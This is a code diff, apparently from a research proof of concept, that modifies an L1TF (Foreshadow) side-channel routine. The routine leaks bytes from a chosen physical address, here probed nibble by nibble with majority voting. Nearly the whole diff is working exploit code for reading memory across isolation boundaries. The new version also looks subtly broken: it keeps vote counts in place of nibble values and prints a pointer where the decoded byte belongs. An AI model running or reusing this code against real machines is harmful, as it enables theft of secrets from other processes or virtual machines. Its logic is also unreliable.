@@ -294,7 +294,6 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
-
   fprintf(stderr, "Request leak and reload buffers\n");
 
   reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
@@ -305,8 +304,8 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
-  const size_t results_size = length * sizeof(uint8_t);
-  uint8_t *results = malloc(results_size);
+  const size_t results_size = (2 * length) * 16 * sizeof(size_t);
+  size_t(*results)[16] = malloc(results_size);
   memset(results, 0, results_size);
 
   fprintf(stderr, "Detecting MDS offenders...\n");
@@ -317,35 +316,36 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
-  while (1) {
-    bool new_data = false;
-    for (size_t j = start; j < start + length; j += 1) {
+  for (int iter = 1; iter <= 10000; ++iter) {
+    // while (true) {
+    for (size_t i = 0, j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
-      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
+      size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
+      size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
 
-      if (leaked_byte != 0) {
-        if (!mds_offenders.ptr[j]) {
-          new_data = true;
-        }
-        results[j - start] = leaked_byte;
-      }
+      // Count the number of times each result has occured
+      results[i++][high]++;
+      results[i++][low]++;
     }
 
-    if (new_data) {
-      printf("Hex: ");
-      for (size_t i = 0; i < length; ++i) {
-        printf("%02x", results[i]);
+    //printf("Leaked from %p (%d):\t", (void *)phys_addr, iter);
+    for (size_t i = 0; i < 2 * length; i += 2) {
+      size_t high = 0, low = 0;
+
+      size_t max_high = maximum(15, &results[i][1]);
+      if (results[i][max_high] > 1) {
+        high = results[i][max_high];
       }
-      printf("\nASCII: ");
-      for (size_t i = 0; i < length; ++i) {
-        char x = results[i];
-        char out[3] = {0};
-        escape_ascii(x, out);
-        printf("%s", out);
+      size_t max_low = maximum(15, &results[i + 1][1]);
+      if (results[i + 1][max_low] > 1) {
+        low = results[i + 1][max_low];
       }
-      printf("\n");
-      memset(results, 0, results_size);
+
+      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
+      printf("%02x ", results);
     }
+    printf("\r");
+    // }
   }
 
   free(results);
